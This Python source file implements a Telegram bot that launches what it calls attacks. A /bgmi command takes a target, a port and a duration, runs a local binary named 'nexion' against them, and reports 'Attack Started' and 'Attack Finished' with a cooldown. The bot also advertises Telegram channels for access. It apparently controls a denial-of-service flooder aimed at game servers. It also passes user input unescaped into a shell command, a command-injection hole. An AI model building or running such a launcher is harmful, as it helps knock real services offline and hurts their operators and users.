from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess
import time
import asyncio
from nexionn import TOKEN  # Import the TOKEN variable
from nexionn import ADMIN_ID  # Import the Admin ID

# Cooldown time in seconds
COOLDOWN_TIME = 60
# Variable to store the time of the last attack
last_attack_time = 0
# Flag to track if an attack is already in progress
attack_in_progress = False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Hello! Use /bgmi <target> <port> <time> to run a command.")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global last_attack_time, attack_in_progress

    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        await update.message.reply_text("DM FOR FREE ACCESS @NEXION_OWNER")
        await update.message.reply_text("JOIN TELEGRAM CHANEL @NEXION_GAMEING")
        return

    # Check if an attack is already in progress
    if attack_in_progress:
        await update.message.reply_text("❌ One attack is already running.")
        return

    current_time = time.time()
    # Check if enough time has passed since the last attack
    if current_time - last_attack_time < COOLDOWN_TIME:
        await update.message.reply_text(f"❌ You must wait {COOLDOWN_TIME} seconds between attacks.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("✅ Usage :- /bgmi <target> <port> <time>")
        return

    target, port, time_duration = context.args

    # Mark the attack as in progress
    attack_in_progress = True

    # Send the attack started message
    await update.message.reply_text(
        f"🔥 Attack Started 🔥\n\n"
        f"🟢 Target: {target}\n"
        f"🟢 Port: {port}\n"
        f"🟢 Duration: {time_duration} seconds"
    )

    # Format the command to run
    command = f"./nexion {target} {port} {time_duration}"

    try:
        # Run the command
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        # Suppress error output
        pass

    # Set the last attack time to the current time
    last_attack_time = current_time

    # Send the attack finished message
    await update.message.reply_text("✅ Attack Finished")

    # Start cooldown and reset attack_in_progress after cooldown ends
    await asyncio.sleep(COOLDOWN_TIME)
    attack_in_progress = False
    await update.message.reply_text("NOW READY TO ATTACK")

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('bgmi', bgmi))

    application.run_polling()

if __name__ == '__main__':
    main()
